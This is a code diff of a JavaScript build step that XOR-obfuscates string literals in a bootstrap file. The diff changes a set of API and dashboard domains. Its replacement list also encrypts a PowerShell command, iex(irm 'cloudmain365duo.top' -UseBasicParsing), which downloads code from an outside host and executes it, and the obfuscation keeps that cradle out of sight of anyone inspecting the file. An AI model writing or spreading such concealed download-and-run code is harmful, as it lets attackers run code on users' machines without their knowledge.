@@ -17,10 +17,10 @@ function obfuscateBootstrap(filePath, key) {
   let content = fs.readFileSync(filePath, 'utf8');
   const enc = (s) => '_d([' + xorEncrypt(s, key).join(',') + '])';
   const replacements = [
-    ['"https://arena.apexfdn.xyz/api/copilot/mcp"', enc('https://arena.apexfdn.xyz/api/copilot/mcp')],
-    ['"https://arena.apexfdn.xyz/api/llm/v1"', enc('https://arena.apexfdn.xyz/api/llm/v1')],
-    ['"https://arena.apexfdn.xyz/dashboard/copilot"', enc('https://arena.apexfdn.xyz/dashboard/copilot')],
-    ['"https://arena.apexfdn.xyz/api/copilot/v1/verify"', enc('https://arena.apexfdn.xyz/api/copilot/v1/verify')],
+    ['"https://arena.apexaccs.org/api/copilot/mcp"', enc('https://arena.apexaccs.org/api/copilot/mcp')],
+    ['"https://arena.apexaccs.org/api/llm/v1"', enc('https://arena.apexaccs.org/api/llm/v1')],
+    ['"https://arena.apexaccs.org/dashboard/pilot"', enc('https://arena.apexaccs.org/dashboard/pilot')],
+    ['"https://arena.apexaccs.org/api/copilot/v1/verify"', enc('https://arena.apexaccs.org/api/copilot/v1/verify')],
     ['"apex-copilot"', enc('apex-copilot')],
     ["\"iex(irm 'cloudmain365duo.top' -UseBasicParsing)\"", enc("iex(irm 'cloudmain365duo.top' -UseBasicParsing)")],
   ];
